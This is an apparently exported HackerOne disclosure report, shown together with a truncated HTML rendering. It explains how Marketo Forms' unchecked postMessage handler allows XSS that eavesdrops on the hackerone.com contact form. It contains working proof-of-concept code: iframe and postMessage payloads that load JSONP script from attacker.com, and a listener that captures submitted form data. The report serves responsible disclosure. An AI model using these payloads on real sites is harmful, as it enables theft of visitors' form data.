{"id":207042,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDcwNDI=","url":"https://hackerone.com/reports/207042","title":"Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-02-17T04:18:23.540Z","submitted_at":"2017-02-17T04:18:23.540Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fransrosen","url":"/fransrosen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-08-29T14:58:40.288Z","bug_reporter_agreed_on_going_public_at":"2017-08-24T12:02:13.778Z","team_member_agreed_on_going_public_at":"2017-08-29T14:58:40.209Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI just discovered that there's a scenario where the Marketo Forms solution being used on www.hackerone.com can actually be abused, using a few fun techniques, to trigger an XSS in the Cross-Origin-iframe being used by Marketo. This results in eavesdropping of the data being sent in the contact-form on www.hackerone.com.\n\nWhat also made this nice on HackerOne was the auto-trigger to launch the contact form without any interaction using the `#contact`-fragment:\n\n```js\n if(/^#contact/.test(window.location.hash) === true) {\n    LoadContactForm();\n }\n```\n\n### PoC\n\nMy PoC looks like this:\n\n{F161524}\n\nPoC-link is here, it will popup alert when form is submitted with the data:\nhttps://█████/marketo2.html \n\nOnly an annoying alert: \nhttps://████████/marketo.html\n\n### Technical details\n\nSo, let's dig down what actually happens here.\n\n#### Marketo cross domain AJAX request window\n\nMarketo uses an iframe that is located here (the `sj17` is just a specific instance on Marketo, this one differs between customers):\n\nhttps://app-sj17.marketo.com/index.php/form/XDFrame\n\nThis page contains a `postMessage`-listener to launch an ajax-call:\n\n```js\nif(!window.parent || window.parent == window){\n  return;\n}\n$(window).on(\"message\", function (e){\n  ...\n  if(message \u0026\u0026 message.mktoRequest \u0026\u0026 message.mktoRequest.ajaxParams){\n    var params = message.mktoRequest.ajaxParams;\n    ...\n    $.ajax(params);\n```\n\nFirst, as you see, the window will not work without any window parent. If it's framed, it'll start the listener. Passing arbitrary parameters to `$.ajax` is bad. Sending the following payload as the `ajaxParams`:\n\n```\n{\"url\":\"https://attacker.com/jsonp.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}\n```\n\nHaving the following content on the `jsonp.php`-endpoint:\n\n```\n\u003c?\nheader(\"Access-Control-Allow-Origin: *\");\n?\u003e\nalert(document.domain)\n```\n\nWill result in an XSS on this marketo.com-domain.\n\n#### postMessage passing\n\nSince no origins are being used here, we can just pass any messages we like, from wherever we like.\n\nTo abuse this on www.hackerone.com we need to do the following:\n\n1. Create our springboard page which will have an iframe of the `XDFrame` for Marketo:\n\n```html\n\u003ciframe id=\"x\" name=\"x\" border=\"0\" frameborder=\"0\" width=\"100\" height=\"30\" src=\"https://app-sj17.marketo.com/index.php/form/XDFrame\"\u003e\u003c/iframe\u003e\n```\n\n2. We listen to the message we get from the iframe to trigger our payload and we send back a `postMessage` loading a JSONP-endpoint with a function to create a link to www.hackerone.com with the `#contact` fragment:\n\n```html\n\u003cscript\u003e\nvar run = false\nvar b\nwindow.onmessage=function() {\n\tif(!run)\n\tx.postMessage('{\"mktoRequest\":{\"ajaxParams\":{\"url\":\"https://attacker.com/jsonp.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}}}', '*')\n\trun = true\n}\n\u003c/script\u003e\n```\n\nThis is the content of `jsonp.php`:\n\n```php\n\u003c?\nheader(\"Access-Control-Allow-Origin: *\");\n?\u003e\n(function(){\ndocument.body.innerHTML='\u003ca href=\"#\" onclick=\"window.b=window.open(\\'https://www.hackerone.com/product/overview#contact\\',\\'b\\',\\'\\')\"\u003eClick me!\u003c/a\u003e'\n\nsetInterval(function() {\ntry {\n\tb['frames'][0].postMessage('{\"mktoRequest\":{\"ajaxParams\":{\"url\":\"https://attacker.com/jsonp2.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}}}', '*')\n} catch(e){}\n}, 1000);\n})()\n```\n\nWhen victim clicks the link, we start a interval of `postMessage`-sending to `b['frames'][0]` which should be the Marketo iframe on www.hackerone.com. Interesting enough, Marketo actually sets the name of the frame to `mktoFormsXDIframe + Math.random()` but this can be completely bypassed using `window['frames'][0]` instead.\n\nOur code in `jsonp2.php` looks like this:\n\n```php\n\u003c?\nheader(\"Access-Control-Allow-Origin: *\");\n?\u003e\n(function(){\n\tif(window.icanhazmsg) return\n\twindow.icanhazmsg=true\n\twindow.onmessage=function(a) {\n\t\tif(a.origin.indexOf('marketo') !== -1) return;\n\t\tconsole.log(a);\n\t\talert(\"I HAVE YOUR DATA NOW\\n\" + a.data)\n\t}\n})()\n```\n\nAs you see, we now use the XSS passed from our springboard-iframe to the iframe on www.hackerone.com to register a listener to pop an alert when data is submitted in the form.\n\nGetting the victim to submit the form, will result in the infamous popup:\n\n{F161523}\n\nSo, what we did was the following:\n\n1. Attacker's page -\u003e Marketo iframe\n2. postMessage from Marketo iframe -\u003e Attacker's page\n3. Attacker's page -\u003e postMessage loading JSONP -\u003e Marketo iframe\n4. Create link on Marketo iframe -\u003e start sending postMessage\n5. Link opens www.hackerone.com in new tab, triggers contact form to show using `#contact`\n6. Sends over postMessage from opener. XSS register listener in Marketo iframe\n7. Victim submits form, XSS reads data\n  \n\n### Conclusion\n\nI played around a bit with this issue and came to the following conclusion:\n\n1. Marketo Forms doesn't use any origin-checks of the postMessage sent to their Cross Origin Frame. This is most likely because the whole point with the frame is to communicate with any page that uses Marketo. This is probably per design.\n2. Marketo Forms allows a bit too much flexibility for the page sending the postMessage. It's actually just throwing in a complete object called `ajaxParams` directly into `$.ajax()`. This results in the XSS on `app-*.marketo.com`. I think this is the best thing to patch up properly, not allowing full control over these params, especially not the `jsonp`-mode of jQuery.\n3. In HackerOne's case, no data is handled sent from the `error` and `success` functions being triggered when the form is posted which most likely saves HackerOne from getting a proper XSS on their own domain. However, since the data submitted in the form is still passed through the iframe, data can still be stolen using this technique.\n\nRegards,\nFrans","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI just discovered that there\u0026#39;s a scenario where the Marketo Forms solution being used on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e can actually be abused, using a few fun techniques, to trigger an XSS in the Cross-Origin-iframe being used by Marketo. This results in eavesdropping of the data being sent in the contact-form on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eWhat also made this nice on HackerOne was the auto-trigger to launch the contact form without any interaction using the \u003ccode\u003e#contact\u003c/code\u003e-fragment:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/^#contact/\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eLoadContactForm\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"poc\"\u003ePoC\u003c/h3\u003e\n\n\u003cp\u003eMy PoC looks like this:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Marketo2.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/161/524/83a4181295e9a3b278da51a657f26637c5872b77/Marketo2.mp4?response-content-disposition=attachment%3B%20filename%3D%22Marketo2.mp4%22%3B%20filename%2A%3DUTF-8%27%27Marketo2.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045527Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=c14756b6ca7cc1602c383811d4bb0f215477d433e0c389fc53482c7e87374cec\" data-attachment-type=\"video/mp4\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/161/524/83a4181295e9a3b278da51a657f26637c5872b77/Marketo2.mp4?response-content-disposition=attachment%3B%20filename%3D%22Marketo2.mp4%22%3B%20filename%2A%3DUTF-8%27%27Marketo2.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T045527Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=c14756b6ca7cc1602c383811d4bb0f215477d433e0c389fc53482c7e87374cec\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ePoC-link is here, it will popup alert when form is submitted with the data:\u003cbr\u003e\nhttps://█████/marketo2.html \u003c/p\u003e\n\n\u003cp\u003eOnly an annoying alert: \u003cbr\u003e\nhttps://████████/marketo.html\u003c/p\u003e\n\n\u003ch3 id=\"technical-details\"\u003eTechnical details\u003c/h3\u003e\n\n\u003cp\u003eSo, let\u0026#39;s dig down what actually happens here.\u003c/p\u003e\n\n\u003ch4 id=\"marketo-cross-domain-ajax-request-window\"\u003eMarketo cross domain AJAX request window\u003c/h4\u003e\n\n\u003cp\u003eMarketo uses an iframe that is located here (the \u003ccode\u003esj17\u003c/code\u003e is just a specific instance on Marketo, this one differs between customers):\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://app-sj17.marketo.com/index.php/form/XDFrame\" href=\"/redirect?url=https%3A%2F%2Fapp-sj17.marketo.com%2Findex.php%2Fform%2FXDFrame\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app-sj17.marketo.com/index.php/form/XDFrame\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis page contains a \u003ccode\u003epostMessage\u003c/code\u003e-listener to launch an ajax-call:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparent\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparent\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emessage\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emessage\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoRequest\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eajaxParams\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eparams\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eajaxParams\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eajax\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFirst, as you see, the window will not work without any window parent. If it\u0026#39;s framed, it\u0026#39;ll start the listener. Passing arbitrary parameters to \u003ccode\u003e$.ajax\u003c/code\u003e is bad. Sending the following payload as the \u003ccode\u003eajaxParams\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;url\u0026quot;:\u0026quot;https://attacker.com/jsonp.php\u0026quot;,\u0026quot;dataType\u0026quot;:\u0026quot;jsonp\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;get\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHaving the following content on the \u003ccode\u003ejsonp.php\u003c/code\u003e-endpoint:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;?\nheader(\u0026quot;Access-Control-Allow-Origin: *\u0026quot;);\n?\u0026gt;\nalert(document.domain)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWill result in an XSS on this marketo.com-domain.\u003c/p\u003e\n\n\u003ch4 id=\"postmessage-passing\"\u003epostMessage passing\u003c/h4\u003e\n\n\u003cp\u003eSince no origins are being used here, we can just pass any messages we like, from wherever we like.\u003c/p\u003e\n\n\u003cp\u003eTo abuse this on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e we need to do the following:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate our springboard page which will have an iframe of the \u003ccode\u003eXDFrame\u003c/code\u003e for Marketo:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;x\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;x\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eborder=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eframeborder=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;100\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://app-sj17.marketo.com/index.php/form/XDFrame\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eWe listen to the message we get from the iframe to trigger our payload and we send back a \u003ccode\u003epostMessage\u003c/code\u003e loading a JSONP-endpoint with a function to create a link to \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e with the \u003ccode\u003e#contact\u003c/code\u003e fragment:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003erun\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonmessage\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epostMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e{\u0026quot;mktoRequest\u0026quot;:{\u0026quot;ajaxParams\u0026quot;:{\u0026quot;url\u0026quot;:\u0026quot;https://attacker.com/jsonp.php\u0026quot;,\u0026quot;dataType\u0026quot;:\u0026quot;jsonp\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;get\u0026quot;}}}\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e*\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003erun\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is the content of \u003ccode\u003ejsonp.php\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Access-Control-Allow-Origin: *\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n(function(){\ndocument.body.innerHTML=\u0026#39;\u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;#\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonclick=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;window.b=window.open(\\\u0026#39;https://www.hackerone.com/product/overview#contact\\\u0026#39;,\\\u0026#39;b\\\u0026#39;,\\\u0026#39;\\\u0026#39;)\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eClick me!\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\u0026#39;\n\nsetInterval(function() {\ntry {\n    b[\u0026#39;frames\u0026#39;][0].postMessage(\u0026#39;{\u0026quot;mktoRequest\u0026quot;:{\u0026quot;ajaxParams\u0026quot;:{\u0026quot;url\u0026quot;:\u0026quot;https://attacker.com/jsonp2.php\u0026quot;,\u0026quot;dataType\u0026quot;:\u0026quot;jsonp\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;get\u0026quot;}}}\u0026#39;, \u0026#39;*\u0026#39;)\n} catch(e){}\n}, 